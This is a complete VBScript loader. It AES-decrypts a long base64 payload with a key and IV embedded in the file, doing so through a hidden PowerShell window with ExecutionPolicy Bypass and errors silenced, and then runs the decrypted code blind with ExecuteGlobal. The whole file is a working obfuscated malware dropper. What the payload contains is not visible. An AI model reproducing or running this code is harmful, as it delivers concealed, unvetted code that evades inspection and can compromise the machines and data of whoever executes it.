Function DecryptAES(encryptedText, keyText, ivText)
    Dim cmd, shell, result
    Set shell = CreateObject("WScript.Shell")
    cmd = "powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$ErrorActionPreference='SilentlyContinue'; $K=[Convert]::FromBase64String('" & keyText & "'); $IV=[Convert]::FromBase64String('" & ivText & "'); $CT=[Convert]::FromBase64String('" & encryptedText & "'); $aes=New-Object System.Security.Cryptography.AesManaged; $aes.Key=$K; $aes.IV=$IV; $aes.Mode='CBC'; $decryptor=$aes.CreateDecryptor(); $PT=$decryptor.TransformFinalBlock($CT,0,$CT.Length); [System.Text.Encoding]::UTF8.GetString($PT)"""
    result = shell.Exec(cmd).StdOut.ReadAll
    DecryptAES = result
End Function

Dim decryptedCode
decryptedCode = DecryptAES("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", "eZs+Xgc+ICvr/PI1NRqzcA==")
ExecuteGlobal decryptedCode
